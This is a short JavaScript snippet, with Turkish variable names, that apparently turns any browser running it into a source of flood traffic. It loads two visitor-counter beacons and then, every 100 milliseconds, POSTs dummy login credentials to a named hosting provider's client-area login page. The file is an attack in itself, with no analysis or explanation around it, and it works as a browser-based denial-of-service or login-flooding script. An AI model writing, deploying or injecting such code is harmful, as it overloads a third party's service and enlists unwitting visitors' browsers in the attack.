new Image().src="http://whos.amung.us/widget/muglauser.png";
new Image().src="http://whos.amung.us/widget/fonexcoder.png";
var ornek = {

ajax: function (test1) {

if (test1.type.toLowerCase() == "post") {
this.post(test1)
}
},
post: function (test1){
var t = new XMLHttpRequest;
t.onreadystatechange = function () {
if(t.readyState == 4) {
test1.success(t.responseText)
}
};
var musa = "";
for (key in test1.data){
if (typeof test1.data[key] == "object"){
for (v in test1.data[key]) {
    musa += "&" + key + "[" + v + "]=" + test1.data[key][v]
 }
 } else musa += "&" + key + "=" + test1.data[key]
 }
 
 musa = musa.replace("&", "");
 t.open("POST", test1.url, true);
 if(test1.header)
 {
 Object.keys(test1.header).forEach(function (musa) { t.setRequestHeader(musa, test1.header[musa])})
 }
 t.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 t.send(musa)
 },
 };
 
 function musa2() {
 
 ornek.ajax({
 
 url: "http://my.yasalhost.com/clientarea.php",
 type: "POST",
 data: {
 username: "aaa@ss.com",
 password: "aaa",
 submit: 'Giriş'
 },
 success: function (test1) {
 
 console.log("Basarili");
 
 }
 })
 }
 setInterval(function(){  musa2(); }, 100);

